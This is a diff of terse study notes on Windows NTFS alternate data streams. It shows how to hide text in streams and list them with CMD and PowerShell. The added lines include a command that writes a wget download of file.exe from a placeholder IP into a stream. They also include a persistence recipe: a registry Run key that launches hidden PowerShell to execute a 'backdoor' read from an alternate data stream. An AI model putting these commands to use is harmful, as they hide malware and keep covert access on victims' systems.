@@ -97,7 +97,7 @@ Computer\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image F
 Alternate Data Streams:
 
 CMD:
-ex1: C:\windows\system32>echo social security numbers > reminder.txt:secret.info 
+ex1: C:\windows\system32>echo social security numbers > reminder.txt:secret.info
 ex2: 
   echo "text" > <file>:<streamfile>     ###creates alt data stream
   notepad <file>:<streamfile>   #views content  
@@ -108,11 +108,17 @@ ex2:
 PWSH:
 ex1: set-Content .\reminder.txt -Value "social security numbers" -Stream secret.info 
 PS Get-Item reminder.txt -Stream *  Get-Item with the -Stream option allows us to see 
-                                                          all streams for *reminder.txt.
+                                                         all streams for *reminder.txt.
 ex2:
   get-item <file> -Stream * or <ads file>
   gci <path> | foreach-object {get-item $_.FullName -Stream *} | where {$_.Stream -ne $DATA} } | get-content
   set-content <path> -Value "txt" -Stream <ads file>
+  
+add-content -passthru <path> -value 'wget IPADDr:445/file.exe -outfile 'location of file to put' 
+persistence:
+new-itemproperty -path HKLM...currentversion\run -name 'name' -propertytype String -value 'C:\powerhsell.exe' -windowstyle hidden - noprofile -command "Get-content C:\uploaded backdoor" -stream script | foreach { powershell -windowstyle hidden -noprofile $_ } " -force -erroraction silentlycontinue
+                        HKEY_Users...^
+
   
 
 
